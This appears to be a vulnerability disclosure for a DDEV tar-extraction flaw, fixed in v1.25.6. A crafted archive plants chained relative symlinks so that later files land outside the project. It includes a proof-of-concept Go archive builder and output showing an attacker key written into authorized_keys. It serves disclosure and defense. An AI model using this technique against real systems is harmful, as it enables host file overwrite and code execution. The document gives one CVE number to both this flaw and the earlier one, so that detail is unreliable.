---
title: "DDEV: A Malicious Import Archive Could Overwrite Files Outside the Project"
date: 2026-11-20
target: "ddev/ddev"
severity: High
identifier: "CVE-2026-32885"
advisory_url: "https://github.com/ddev/ddev/security/advisories/GHSA-vxj4-5gfg-97c2"
summary: "DDEV's Untar confines symlink targets with a lexical check against each entry's parent directory. The check never resolves symlinks an earlier archive entry already wrote to disk, so a short chain of relative links re-roots a later path component and a following file entry lands outside the extraction directory. This reopened the arbitrary host file write that the v1.25.4 fix was meant to close. Fixed in v1.25.6."
---

## Summary

DDEV extracts attacker supplied tar archives during everyday operations such as
`ddev import-db` and `ddev import-files`. The v1.25.4 fix for an earlier symlink
escape rejected absolute symlink targets and confined relative ones with a
lexical containment check. That check validates each symlink target against the
entry's lexical parent directory. It never accounts for symlinks that an earlier
entry in the same archive already created on disk.

A crafted archive can plant a short chain of relative symlinks that re-root a
later path component, so a following regular file entry is written through those
links to a location outside the destination directory. The result is arbitrary
file create and overwrite on the host with the privileges of the user running
DDEV, which restores the primitive that v1.25.4 was meant to close.

Reported privately on 2026-11-10, fixed in DDEV v1.25.6, published as
[GHSA-vxj4-5gfg-97c2](https://github.com/ddev/ddev/security/advisories/GHSA-vxj4-5gfg-97c2)
(CVE-2026-32885, CVSS 8.8, CWE-22 and CWE-59).

## Background

DDEV is a local development environment for PHP projects. Several of its
commands consume archives that the developer points it at: a database dump, a
files tarball, or a project asset handled by one of the per CMS importers in
`pkg/ddevapp`. All of those paths end up in `archive.Untar` (`pkg/archive`),
which walks the tar stream and writes each entry under a destination directory.

Two earlier fixes shaped the function. A ZipSlip fix (`#8213`) added a lexical
prefix check so no entry path escapes the destination. A follow up (`#8625`,
shipped in v1.25.4, the fix for GHSA-9hq4-hm3j-jmph / CVE-2026-32885) hardened
the symlink case after a report that an absolute symlink target could point the
write anywhere. That fix rejects absolute targets and confines relative ones.

The assumption left behind was that validating a symlink's target against its
lexical parent is enough. That assumption is what the next section breaks.

## The vulnerability

The symlink case in `pkg/archive/archive.go`, as patched in v1.25.4:

```go
if isArchiveAbsolutePath(file.Linkname) {
    return fmt.Errorf("symlink target %q ... is absolute, which is not allowed", ...)
}
resolvedTarget := filepath.Join(fullPathDir, file.Linkname)
if !strings.HasPrefix(filepath.Clean(resolvedTarget)+string(os.PathSeparator),
    filepath.Clean(dest)+string(os.PathSeparator)) {
    return fmt.Errorf("symlink target %q ... escapes destination directory", ...)
}
_ = os.Remove(fullPath)
err = os.Symlink(file.Linkname, fullPath)
```

`fullPathDir` is the lexical parent of the entry path,
`filepath.Dir(filepath.Join(dest, file.Name))`. The check joins the relative
symlink target to that lexical parent and confirms the cleaned result stays
under `dest`. The ZipSlip guard near the top of the loop is the same shape. Both
are purely lexical. Neither resolves symlinks that an earlier archive entry has
already written to disk.

That reasoning only holds if the on-disk parent matches the lexical parent.
During extraction it does not, because an earlier entry can turn a parent
component into a symlink. The attack builds a re-rooting chain, entry by entry:

1. `d/` is a directory.
2. `d/s` is a symlink to `..`. Its lexical parent is `dest/d`, so the target
   resolves lexically to `dest` and passes. On disk `dest/d/s` now points to
   `dest`.
3. `d/s/x` is a symlink to `..`. Its lexical parent is `dest/d/s`, so the target
   resolves lexically to `dest/d` and passes. But on disk `dest/d/s` already
   resolves to `dest`, so `os.Symlink` creates the link at the real path
   `dest/x` with target `..`. Now `dest/x` points to the parent of `dest`.
4. `d/s/x/<name>` is a regular file. The lexical path `dest/d/s/x/<name>` passes
   the ZipSlip guard. On disk `dest/d/s/x` resolves to the parent of `dest`, so
   `os.Create` writes `<name>` outside `dest`.

Each extra `../` hop in the chain climbs one more directory level, so the
attacker can reach any absolute path the DDEV user can write, including the home
directory. Hardlink entries (`tar.TypeLink`) are not handled by the switch and
are not part of this; the defect is the symlink chain.

## Proof of concept

Two self contained Go tests run the real `Untar` from the patched v1.25.4 tree
(commit `7034963403c5374fecceb02070d27b335329cede`, which contains the
`isArchiveAbsolutePath` fix). The archive builder plants the chain and then
writes a file through it:

```go
// Entries, order matters:
//   d/              dir
//   d/s   -> ..     lexically resolves to dest, allowed
//   d/s/x -> ..     lexical parent dest/d/s -> dest/d, allowed; but on disk
//                   dest/d/s is already a symlink to dest, so os.Symlink
//                   creates the real link dest/x -> .. (points above dest)
//   d/s/x/<name>    regular file, written through dest/x -> .. -> parent(dest)
write(&tar.Header{Name: "d/", Typeflag: tar.TypeDir, Mode: 0o755}, nil)
write(&tar.Header{Name: "d/s", Typeflag: tar.TypeSymlink, Linkname: "..", Mode: 0o777}, nil)
write(&tar.Header{Name: "d/s/x", Typeflag: tar.TypeSymlink, Linkname: "..", Mode: 0o777}, nil)
write(&tar.Header{Name: "d/s/x/" + escapedName, Typeflag: tar.TypeReg, Mode: 0o644, Size: int64(len(body))}, body)
```

Test one plants `VICTIM.txt` as a sibling of `dest` and overwrites it from
inside the archive. Test two places `dest` two levels under a root that holds
`root/.ssh/authorized_keys`, extends the chain by one more `..` hop, and
overwrites that file with an attacker key:

```
Untar returned: <nil>
VICTIM.txt (outside dest) now contains: "PWNED-BY-ESCAPE"
dest/x exists: mode=Lrwxrwxrwx -> ".." (symlink pointing above dest)

Untar returned: <nil>
root/.ssh/authorized_keys (two levels ABOVE dest) now: "ssh-ed25519 AAAA-ATTACKER-KEY pwned"
```

`Untar` returns no error in either case while files outside `dest` are created
and overwritten.

## Impact

A developer who imports an attacker supplied archive triggers extraction through
`archive.Untar`. The crafted archive writes or overwrites files anywhere the
DDEV user can write. Writing to `~/.ssh/authorized_keys`, a shell startup file,
or a Git hook turns that into code execution. This is the same severity and
threat model as the parent advisory: CVSS 8.8,
`AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`. No authentication to the victim is
needed, and no non-default configuration; the only interaction is the victim
importing the archive.

Reachable callers include `ddev import-db` and `ddev import-files` along with
the per CMS importers in `pkg/ddevapp` (`magento.go`, `wordpress.go`,
`drupal.go`, `craftcms.go`, `shopware6.go`, `backdrop.go`, `typo3.go`,
`codeigniter.go`, `modx.go`).

## The fix

Lexical containment cannot be trusted while writing through a tree the same
archive is still building, because the on-disk parent can already be a symlink.
DDEV v1.25.6 stops reasoning lexically and extracts under an `os.Root`
(`#9098`), rooted at the destination. `os.Root`, added in Go 1.24, resolves
every path operation relative to the root and refuses to follow a symlink out of
it, so the kernel enforces containment and the re-rooting chain cannot leave the
destination. That is the most robust of the options and removes the whole class
rather than patching the one chain shape.

Validating the symlink target alone was never enough here, because the escape
comes from the parent components, not the final target.

## Timeline

- 2026-11-10: reported to the vendor through GitHub private vulnerability reporting.
- 2026-11-12: fix merged, extraction moved under `os.Root` (`#9098`).
- 2026-11-20: DDEV v1.25.6 released and advisory published.

## Disclosure

[GHSA-vxj4-5gfg-97c2](https://github.com/ddev/ddev/security/advisories/GHSA-vxj4-5gfg-97c2),
CVE-2026-32885. Fixed in DDEV v1.25.6.
